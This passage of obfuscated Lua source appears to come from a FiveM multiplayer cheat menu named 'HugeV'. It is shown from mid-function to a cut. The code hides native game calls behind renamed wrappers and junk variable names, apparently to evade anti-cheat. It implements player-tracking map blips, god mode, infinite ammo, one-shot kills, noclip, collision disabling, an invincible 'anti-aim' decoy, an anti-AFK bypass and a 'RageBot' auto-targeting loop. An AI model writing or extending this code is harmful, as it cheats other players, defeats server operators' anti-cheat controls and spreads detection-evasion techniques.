                                    Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 274)
                                    Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                end
                            elseif veh_DSGIJSODGSDG then
                                local vehClass_DSIGJOSDIGSDG =
                                    Czitirzen_InvokeNative(0x29439776AAA00A62, veh_DSGIJSODGSDG)
                                local vehModel_DSIOGJSODGSD =
                                    Czitirzen_InvokeNative(0x9F47B058362C84B5, veh_DSGIJSODGSDG)
                                if vehClass_DSIGJOSDIGSDG == 15 then -- Helicopters
                                    if blipSprite_DSIOGJOISDGSDG ~= 422 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 422)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif vehClass_DSIGJOSDIGSDG == 8 then -- Motorcycles
                                    if blipSprite_DSIOGJOISDGSDG ~= 226 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 226)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif vehClass_DSIGJOSDIGSDG == 16 then -- Plane
                                    if
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "besra") or
                                            vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "hydra") or
                                            vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "lazer")
                                     then -- Jets
                                        if blipSprite_DSIOGJOISDGSDG ~= 424 then
                                            Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 424)
                                            Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                        end
                                    elseif blipSprite_DSIOGJOISDGSDG ~= 423 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 423)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif vehClass_DSIGJOSDIGSDG == 14 then -- Boat
                                    if blipSprite_DSIOGJOISDGSDG ~= 427 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 427)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif
                                    vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "insurgent") or
                                        vehModel_DSIOGJSODGSD ==
                                            Czitirzen_InvokeNative(0xD24D37CC275948CC, "insurgent2") or
                                        vehModel_DSIOGJSODGSD ==
                                            Czitirzen_InvokeNative(0xD24D37CC275948CC, "insurgent3")
                                 then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
                                    if blipSprite_DSIOGJOISDGSDG ~= 426 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 426)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "limo2") then -- Turreted Limo
                                    if blipSprite_DSIOGJOISDGSDG ~= 460 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 460)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "rhino") then -- Tank
                                    if blipSprite_DSIOGJOISDGSDG ~= 421 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 421)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif
                                    vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "trash") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "trash2")
                                 then -- Trash
                                    if blipSprite_DSIOGJOISDGSDG ~= 318 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 318)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "pbus") then -- Prison Bus
                                    if blipSprite_DSIOGJOISDGSDG ~= 513 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 513)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif
                                    vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "seashark") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "seashark2") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "seashark3")
                                 then -- Speedophiles
                                    if blipSprite_DSIOGJOISDGSDG ~= 471 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 471)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif
                                    vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "cargobob") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "cargobob2") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "cargobob3") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "cargobob4")
                                 then -- Cargobobs
                                    if blipSprite_DSIOGJOISDGSDG ~= 481 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 481)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif
                                    vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "technical") or
                                        vehModel_DSIOGJSODGSD ==
                                            Czitirzen_InvokeNative(0xD24D37CC275948CC, "technical2") or
                                        vehModel_DSIOGJSODGSD ==
                                            Czitirzen_InvokeNative(0xD24D37CC275948CC, "technical3")
                                 then -- Technical
                                    if blipSprite_DSIOGJOISDGSDG ~= 426 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 426)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "taxi") then -- Cab/ Taxi
                                    if blipSprite_DSIOGJOISDGSDG ~= 198 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 198)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif
                                    vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "fbi") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "fbi2") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "police2") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "police3") or -- Police Vehicles
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "police") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "sheriff2") or
                                        vehModel_DSIOGJSODGSD == Czitirzen_InvokeNative(0xD24D37CC275948CC, "sheriff") or
                                        vehModel_DSIOGJSODGSD ==
                                            Czitirzen_InvokeNative(0xD24D37CC275948CC, "policeold2")
                                 then
                                    if blipSprite_DSIOGJOISDGSDG ~= 56 then
                                        Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 56)
                                        Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                    end
                                elseif blipSprite_DSIOGJOISDGSDG ~= 1 then -- default blip_DSUFSDGSD
                                    Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
                                    Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                end

                                -- Show number in case of passangers
                                local passengers_DIFJOSDIGSDGSD = GetVehicleNumberOfPassengers(veh_DSGIJSODGSDG)

                                if passengers_DIFJOSDIGSDGSD > 0 then
                                    if not IsVehicleSeatFree(veh_DSGIJSODGSDG, -1) then
                                        passengers_DIFJOSDIGSDGSD = passengers_DIFJOSDIGSDGSD + 1
                                    end
                                    Czitirzen_InvokeNative(
                                        0xA3C0B359DCB848B6,
                                        blip_DSUFSDGSD,
                                        passengers_DIFJOSDIGSDGSD
                                    )
                                else
                                    Czitirzen_InvokeNative(0x532CFF637EF80148, blip_DSUFSDGSD)
                                end
                            else
                                -- Remove leftover number
                                Czitirzen_InvokeNative(0x532CFF637EF80148, blip_DSUFSDGSD)

                                if blipSprite_DSIOGJOISDGSDG ~= 1 then -- default blip_DSUFSDGSD
                                    Czitirzen_InvokeNative(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
                                    Czitirzen_InvokeNative(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
                                end
                            end

                            Czitirzen_InvokeNative(
                                0xF87683CDF73C3F6E,
                                blip_DSUFSDGSD,
                                math.ceil(GetEntityHeading(veh_DSGIJSODGSDG))
                            ) -- update rotation
                            Czitirzen_InvokeNative(0x127DE7B20C60A6A3, blip_DSUFSDGSD, id_DSHGSIUDGSD) -- update blip_DSUFSDGSD name
                            Czitirzen_InvokeNative(0xD38744167B2FA257, blip_DSUFSDGSD, 0.85) -- set scale

                            -- set Player alpha
                            if Czitirzen_InvokeNative(0xB0034A223497FFCB) then
                                Czitirzen_InvokeNative(0x45FF974EEE1C8734, blip_DSUFSDGSD, 255)
                            else
                                x1_DASUIHDSGSDGSD, y1_DASUIHDSGSDGSD =
                                    table.unpack(
                                    HugeV.functions.getEntityCoords(Czitirzen_InvokeNative(0xD80958FC74E988A6), true)
                                )
                                x2_DASUIHDSGSDGSD, y2_DASUIHDSGSDGSD =
                                    table.unpack(
                                    HugeV.functions.getEntityCoords(
                                        Czitirzen_InvokeNative(0x43A66C31C68491C0, id_DSHGSIUDGSD),
                                        true
                                    )
                                )
                                distance_idshgsdgsdfg =
                                    (math.floor(
                                    math.abs(
                                        math.sqrt(
                                            (x1_DASUIHDSGSDGSD - x2_DASUIHDSGSDGSD) *
                                                (x1_DASUIHDSGSDGSD - x2_DASUIHDSGSDGSD) +
                                                (y1_DASUIHDSGSDGSD - y2_DASUIHDSGSDGSD) *
                                                    (y1_DASUIHDSGSDGSD - y2_DASUIHDSGSDGSD)
                                        )
                                    ) / -1
                                )) + 900
                                -- Probably a way easier way to do this but whatever im an idiot

                                if distance_idshgsdgsdfg < 0 then
                                    distance_idshgsdgsdfg = 0
                                elseif distance_idshgsdgsdfg > 255 then
                                    distance_idshgsdgsdfg = 255
                                end
                                Czitirzen_InvokeNative(0x45FF974EEE1C8734, blip_DSUFSDGSD, distance_idshgsdgsdfg)
                            end
                        end
                    end
                end
            else
                local plist_DSGUSDIGDS = GetActivePlayers()
                for i_SDUGIHSDGSDGDSG = 1, #plist_DSGUSDIGDS do
                    local id_DSHGSIUDGSD = plist_DSGUSDIGDS[i_SDUGIHSDGSDGDSG]
                    local ped_DSGUISDGSDG = Czitirzen_InvokeNative(0x43A66C31C68491C0, id_DSHGSIUDGSD)
                    local blip_DSUFSDGSD = Czitirzen_InvokeNative(0xBC8DBDCA2436F7E8, ped_DSGUISDGSDG)
                    if Czitirzen_InvokeNative(0xA6DB27D19ECBB7DA, blip_DSUFSDGSD) then -- Removes blip_DSUFSDGSD
                        Czitirzen_InvokeNative(0x86A652570E5F25DD, Citizen.PointerValueIntInitialized(blip_DSUFSDGSD))
                    end
                end
            end

            if HugeV.locals.MakeUFlare then
                local coords_UYDUHIFGDGFD =
                    HugeV.functions.getEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, -1))
                if HugeV.locals.peds[1] == HugeV.Player.PedId then
                    Czitirzen_InvokeNative(
                        0x172AA1B624FA1013,
                        HugeV.locals.peds[2],
                        coords_UYDUHIFGDGFD.x,
                        coords_UYDUHIFGDGFD.y,
                        coords_UYDUHIFGDGFD.z,
                        22,
                        100000.0,
                        true,
                        false,
                        0.0
                    )
                else
                    Czitirzen_InvokeNative(
                        0x172AA1B624FA1013,
                        HugeV.locals.peds[1],
                        coords_UYDUHIFGDGFD.x,
                        coords_UYDUHIFGDGFD.y,
                        coords_UYDUHIFGDGFD.z,
                        22,
                        100000.0,
                        true,
                        false,
                        0.0
                    )
                end
            end

            if HugeV.locals.VehGod then
                Czitirzen_InvokeNative(
                    0x3882114BDE571AD4,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0xD80958FC74E988A6)),
                    true
                )
                Czitirzen_InvokeNative(
                    0x59BF8C3D52C92F66,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0xD80958FC74E988A6)),
                    false
                )
            else
                Czitirzen_InvokeNative(
                    0x3882114BDE571AD4,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0xD80958FC74E988A6)),
                    false
                )
                Czitirzen_InvokeNative(
                    0x59BF8C3D52C92F66,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0xD80958FC74E988A6)),
                    true
                )
            end

            if HugeV.locals.VehBoost then
                Czitirzen_InvokeNative(
                    0x93A3996368C94158,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false),
                    9999.0 * 20.0
                )
            else
                Czitirzen_InvokeNative(
                    0x93A3996368C94158,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false),
                    20.0
                )
            end

            if HugeV.locals.force3person then
                Czitirzen_InvokeNative(0x5A4F9EDF1673F704, 0)
                Czitirzen_InvokeNative(0xAC253D7842768F48, 0)
            end

            if HugeV.locals.forceDriveBy then
                Czitirzen_InvokeNative(0x6E8834B52EC20C77, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), true)
            end

            if HugeV.locals.InfinityAmmo then
                for i_didsfyg98sduriesdfg = 1, #HugeV.locals.AllGuns do
                    Czitirzen_InvokeNative(0x183DADC6AA953186, Czitirzen_InvokeNative(0xD80958FC74E988A6), true)
                    Czitirzen_InvokeNative(
                        0x3EDCB0505123623B,
                        Czitirzen_InvokeNative(0xD80958FC74E988A6),
                        true,
                        "WEAPON_" .. HugeV.locals.AllGuns[i_didsfyg98sduriesdfg]
                    )
                end
            else
                for i_didsfyg98sduriesdfg = 1, #HugeV.locals.AllGuns do
                    Czitirzen_InvokeNative(0x183DADC6AA953186, Czitirzen_InvokeNative(0xD80958FC74E988A6), false)
                    Czitirzen_InvokeNative(
                        0x3EDCB0505123623B,
                        Czitirzen_InvokeNative(0xD80958FC74E988A6),
                        false,
                        "WEAPON_" .. HugeV.locals.AllGuns[i_didsfyg98sduriesdfg]
                    )
                end
            end

            if HugeV.locals.OneShot then
                Czitirzen_InvokeNative(0xCE07B9F7817AADA3, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), 10000.0)
                Czitirzen_InvokeNative(0x4A3DC7ECCC321032, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), 10000.0)
            else
                Czitirzen_InvokeNative(0xCE07B9F7817AADA3, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), 1.0)
                Czitirzen_InvokeNative(0x4A3DC7ECCC321032, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), 1.0)
            end

            if HugeV.locals.AntiAntiAfk and not HugeV.locals.walking_antiantiafk then
                HugeV.locals.walking_antiantiafk = true
                local veh = GetVehiclePedIsIn(HugeV.Player.PedId)

                if DoesEntityExist(veh) then
                    TaskVehicleDriveWander(HugeV.Player.PedId, veh, 40.0, 0)
                else
                    TaskWanderStandard(HugeV.Player.PedId, 10.0, 10)
                end
            end

            if not HugeV.locals.AntiAntiAfk and HugeV.locals.walking_antiantiafk then
                ClearPedTasks(HugeV.Player.PedId)
                HugeV.locals.walking_antiantiafk = false
            end

            if HugeV.locals.disable_collisions then
                local playerveh = GetVehiclePedIsIn(HugeV.Player.PedId, false)
                for object in EnumerateObjects() do
                    SetEntityNoCollisionEntity(object, HugeV.Player.PedId, true)
                    SetEntityNoCollisionEntity(object, playerveh, true)
                end

                for vehicle in EnumerateVehicles() do
                    SetEntityNoCollisionEntity(vehicle, HugeV.Player.PedId, true)
                    SetEntityNoCollisionEntity(vehicle, playerveh, true)
                end

                for ped in EnumeratePeds() do
                    SetEntityNoCollisionEntity(ped, HugeV.Player.PedId, true)
                    SetEntityNoCollisionEntity(ped, playerveh, true)
                end
            end

            if HugeV.locals.fastrun then
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                SetPedMoveRateOverride(HugeV.Player.PedId, 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                SetPedMoveRateOverride(HugeV.Player.PedId, 1.0)
            end

            if HugeV.locals.ePunch then
                SetExplosiveMeleeThisFrame(HugeV.Player.LocalId)
            end

            if HugeV.locals.nofog then
                SetWeatherTypePersist("CLEAR")
                SetWeatherTypeNowPersist("CLEAR")
                SetWeatherTypeNow("CLEAR")
                SetOverrideWeather("CLEAR")
                SetTimecycleModifier("CS1_railwayB_tunnel")
            else
                SetWeatherTypePersist("EXTRASUNNY")
                SetWeatherTypeNowPersist("EXTRASUNNY")
                SetWeatherTypeNow("EXTRASUNNY")
                SetOverrideWeather("EXTRASUNNY")
                SetTimecycleModifier("AP1_01_B_IntRefRange")
            end

            if HugeV.locals.Noclip then
                local current_Speed_dishgosdfiulgjdsfg = 2
                local Noclip_Entity_UHDGIUDFLGDFG =
                    Czitirzen_InvokeNative(0x997ABD671D25CA0B, Czitirzen_InvokeNative(0xD80958FC74E988A6), false) and
                    Czitirzen_InvokeNative(0x6094AD011A2EA87D, Czitirzen_InvokeNative(0xD80958FC74E988A6)) or
                    Czitirzen_InvokeNative(0xD80958FC74E988A6)
                Czitirzen_InvokeNative(0x428CA6DBD1094446, Czitirzen_InvokeNative(0xD80958FC74E988A6), true)
                Czitirzen_InvokeNative(0x3882114BDE571AD4, Czitirzen_InvokeNative(0xD80958FC74E988A6), true)

                if IsDisabledControlPressed(0, HugeV.locals.keys["LEFTSHIFT"]) then
                    current_Speed_dishgosdfiulgjdsfg = 6
                end

                local new_Pos_dihsufoiugidsfgdsfg = GetEntityCoords(fkioergreopgiproeguioepr)

                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 32, true) --MoveUpOnly
                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 268, true) --MoveUp

                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 31, true) --MoveUpDown

                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 269, true) --MoveDown
                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 33, true) --MoveDownOnly

                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 266, true) --MoveLeft
                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 34, true) --MoveLeftOnly

                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 30, true) --MoveLeftRight

                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 267, true) --MoveRight
                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 35, true) --MoveRightOnly

                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 44, true) --Cover
                Czitirzen_InvokeNative(0xFE99B66D079CF6BC, 0, 20, true) --MultiplayerInfo

                local y_off_idfhusdgiolgdsigsdrssdfg = 0.0
                local z_off_dauigisdfhgodsfgdsg = 0.0

                if Czitirzen_InvokeNative(0xE2587F8CBBD87B1D, 0, 32) then
                    y_off_idfhusdgiolgdsigsdrssdfg = 0.5
                end
                if Czitirzen_InvokeNative(0xE2587F8CBBD87B1D, 0, 33) then
                    y_off_idfhusdgiolgdsigsdrssdfg = -0.5
                end
                if Czitirzen_InvokeNative(0xE2587F8CBBD87B1D, 0, 34) then
                    Czitirzen_InvokeNative(
                        0x8E2530AA8ADA980E,
                        Czitirzen_InvokeNative(0xD80958FC74E988A6),
                        GetEntityHeading(Czitirzen_InvokeNative(0xD80958FC74E988A6)) + 3.0
                    )
                end
                if Czitirzen_InvokeNative(0xE2587F8CBBD87B1D, 0, 35) then
                    Czitirzen_InvokeNative(
                        0x8E2530AA8ADA980E,
                        Czitirzen_InvokeNative(0xD80958FC74E988A6),
                        GetEntityHeading(Czitirzen_InvokeNative(0xD80958FC74E988A6)) - 3.0
                    )
                end
                if Czitirzen_InvokeNative(0xE2587F8CBBD87B1D, 0, 44) then
                    z_off_dauigisdfhgodsfgdsg = 0.21
                end
                if Czitirzen_InvokeNative(0xE2587F8CBBD87B1D, 0, 20) then
                    z_off_dauigisdfhgodsfgdsg = -0.21
                end

                new_Pos_dihsufoiugidsfgdsfg =
                    GetOffsetFromEntityInWorldCoords(
                    Noclip_Entity_UHDGIUDFLGDFG,
                    0.0,
                    y_off_idfhusdgiolgdsigsdrssdfg * (current_Speed_dishgosdfiulgjdsfg + 0.3),
                    z_off_dauigisdfhgodsfgdsg * (current_Speed_dishgosdfiulgjdsfg + 0.3)
                )

                local heading_idfhgsodiugsdrsdfg = GetEntityHeading(Noclip_Entity_UHDGIUDFLGDFG)
                Czitirzen_InvokeNative(0x1C99BB7B6E96D16F, Noclip_Entity_UHDGIUDFLGDFG, 0.0, 0.0, 0.0)
                Czitirzen_InvokeNative(0x8524A8B0171D5E07, Noclip_Entity_UHDGIUDFLGDFG, 0.0, 0.0, 0.0, 0, false)
                Czitirzen_InvokeNative(0x8E2530AA8ADA980E, Noclip_Entity_UHDGIUDFLGDFG, heading_idfhgsodiugsdrsdfg)

                Czitirzen_InvokeNative(0x1A9205C1B9EE827F, Noclip_Entity_UHDGIUDFLGDFG, false, false)
                Czitirzen_InvokeNative(
                    0x239A3351AC1DA385,
                    Noclip_Entity_UHDGIUDFLGDFG,
                    new_Pos_dihsufoiugidsfgdsfg.x,
                    new_Pos_dihsufoiugidsfgdsfg.y,
                    new_Pos_dihsufoiugidsfgdsfg.z,
                    true,
                    true,
                    true
                )

                Czitirzen_InvokeNative(0x428CA6DBD1094446, Noclip_Entity_UHDGIUDFLGDFG, false)
                Czitirzen_InvokeNative(0x3882114BDE571AD4, Noclip_Entity_UHDGIUDFLGDFG, false)
                Czitirzen_InvokeNative(0x1A9205C1B9EE827F, Noclip_Entity_UHDGIUDFLGDFG, true, true)
            end

            if HugeV.locals.DisplayRadar then
                DisplayRadar(true)
            end

            if HugeV.locals.InfiniteCombatRoll then
                for i = 0, 3 do
                    StatSetInt(GetHashKey("mp" .. i .. "_shooting_ability"), 9999, true)
                    StatSetInt(GetHashKey("sp" .. i .. "_shooting_ability"), 9999, true)
                end
            else
                for i = 0, 3 do
                    StatSetInt(GetHashKey("mp" .. i .. "_shooting_ability"), 0, true)
                    StatSetInt(GetHashKey("sp" .. i .. "_shooting_ability"), 0, true)
                end
            end

            if HugeV.locals.AntiAim then
                yaw = (yaw or 0) + math.random(10, 50)
                local ped_DSIHGUSDGSD = HugeV.Player.PedId
                --[[Czitirzen_InvokeNative(0x6EA47DAE7FAD0EED, "move_ped_crouched")
	
	while ( not Czitirzen_InvokeNative(0xC4EA073D86FB29B0, "move_ped_crouched", Citizen.ReturnResultAnyway()) ) do 
		Wait( 100 )
	end 
	
	if ( HugeV.locals.crouched == true ) then 
		Czitirzen_InvokeNative(0xAA74EC0CB0AAEA2C, ped_DSIHGUSDGSD, 0 )
		Czitirzen_InvokeNative(0xAA74EC0CB0AAEA2C, HugeV.locals.anti_aim_ped, 0 )
		HugeV.locals.crouched = false 
	elseif ( HugeV.locals.crouched == false ) then
		Czitirzen_InvokeNative(0xAF8A94EDE7712BEF, ped_DSIHGUSDGSD, "move_ped_crouched", 0.25 )
		Czitirzen_InvokeNative(0xAF8A94EDE7712BEF, HugeV.locals.anti_aim_ped, "move_ped_crouched", 0.25 )
		HugeV.locals.crouched = true 
	end]]
                ClearPedLastWeaponDamage(HugeV.Player.PedId)

                if HugeV.locals.anti_aim_ped == nil then
                    local coords = GetEntityCoords(HugeV.Player.PedId)
                    HugeV.locals.anti_aim_ped =
                        CreatePed(
                        4,
                        GetEntityModel(HugeV.Player.PedId),
                        coords.x,
                        coords.y,
                        coords.z,
                        GetEntityHeading(HugeV.Player.PedId),
                        true,
                        false
                    )
                else
                    local coords = GetEntityCoords(HugeV.Player.PedId)
                    SetEntityCoordsNoOffset(HugeV.locals.anti_aim_ped, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)
                    SetEntityHeading(HugeV.locals.anti_aim_ped, GetEntityHeading(HugeV.Player.PedId))
                    SetEntityRotation(HugeV.locals.anti_aim_ped, 35.0, 0.0, yaw + 0.0, 1, true)
                    SetEntityRotation(ped_DSIHGUSDGSD, 35.0, 0.0, yaw + 0.0, 1, true)

                    -- FAKE AA XD --
                    SetEntityVisible(HugeV.locals.anti_aim_ped, false, false)
                    SetEntityLocallyVisible(HugeV.locals.anti_aim_ped)
                    SetEntityAlpha(HugeV.locals.anti_aim_ped, 150)

                    -- GODMODE --

                    SetEntityInvincible(HugeV.locals.anti_aim_ped, true)
                    ClearPedBloodDamage(HugeV.locals.anti_aim_ped)
                    ResetPedVisibleDamage(HugeV.locals.anti_aim_ped)
                    ClearPedLastWeaponDamage(HugeV.locals.anti_aim_ped)
                    SetEntityProofs(HugeV.locals.anti_aim_ped, true, true, true, true, true, true, true, true)
                    SetEntityOnlyDamagedByPlayer(HugeV.locals.anti_aim_ped, false)
                    SetEntityCanBeDamaged(HugeV.locals.anti_aim_ped, false)
                end

                if IsDisabledControlPressed(1, HugeV.locals.keys["W"]) then
                    local dx, dy, dz = GetCamDirection_Czlowiek_KOZACZEK()
                    if dx < 0 then
                        dx = dx - 3.0
                    end
                    if dx > 0 then
                        dx = dx + 3.0
                    end
                    if dy < 0 then
                        dy = dy - 3.0
                    end
                    if dy > 0 then
                        dy = dy + 3.0
                    end
                    SetEntityVelocity(HugeV.locals.anti_aim_ped, dx, dy, -0.250)
                    SetEntityVelocity(HugeV.Player.PedId, dx, dy, -0.250)
                end
            else
                if HugeV.locals.anti_aim_ped == nil then
                else
                    SetEntityAsMissionEntity(HugeV.locals.anti_aim_ped, true, true)
                    DeleteEntity(HugeV.locals.anti_aim_ped)
                    HugeV.locals.anti_aim_ped = nil
                end
            end

            if HugeV.locals.RageBot then
                for i_didsfyg98sduriesdfg = 0, #HugeV.locals.ids do
                    rage_bot_UGDUYFHDSIGKHUIDFGDFG(
                        Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.ids[i_didsfyg98sduriesdfg])
                    )
                end
            end

            if HugeV.locals.Celownik1 then
                local aiming_idhgsiduhgidf, fkioergreopgiproeguioepr =
                    GetEntityPlayerIsFreeAimingAt(Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), fkioergreopgiproeguioepr)
                local aiming_idhgsiduhgidf2 =
                    Czitirzen_InvokeNative(0x2E397FD2ECD37C87, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6))
                if aiming_idhgsiduhgidf2 and not aiming_idhgsiduhgidf then
                    narysuj_celownik_xd_uhfaidsoulgdfsdfg("+", 0.495, 0.484)
                elseif aiming_idhgsiduhgidf then
                    if
                        Czitirzen_InvokeNative(0x524AC5ECEA15343E, fkioergreopgiproeguioepr) and
                            not Czitirzen_InvokeNative(0x3317DEDB88C95038, fkioergreopgiproeguioepr, 0) and
                            Czitirzen_InvokeNative(0x12534C348C6CB68B, fkioergreopgiproeguioepr)
                     then
                        narysuj_celownik_xd_uhfaidsoulgdfsdfg("~r~+", 0.495, 0.484)
                    else
                        narysuj_celownik_xd_uhfaidsoulgdfsdfg("+", 0.495, 0.484)
                    end
                end
            end

            if HugeV.locals.Celownik2 then
                local aiming_idhgsiduhgidf, fkioergreopgiproeguioepr =
                    GetEntityPlayerIsFreeAimingAt(Czitirzen_InvokeNative(0x4F8644AF03D0E0D6), fkioergreopgiproeguioepr)
                local aiming_idhgsiduhgidf2 =
                    Czitirzen_InvokeNative(0x2E397FD2ECD37C87, Czitirzen_InvokeNative(0x4F8644AF03D0E0D6))
                if aiming_idhgsiduhgidf2 and not aiming_idhgsiduhgidf then
                    narysuj_celownik_xd_uhfaidsoulgdfsdfg(".", 0.4968, 0.478)
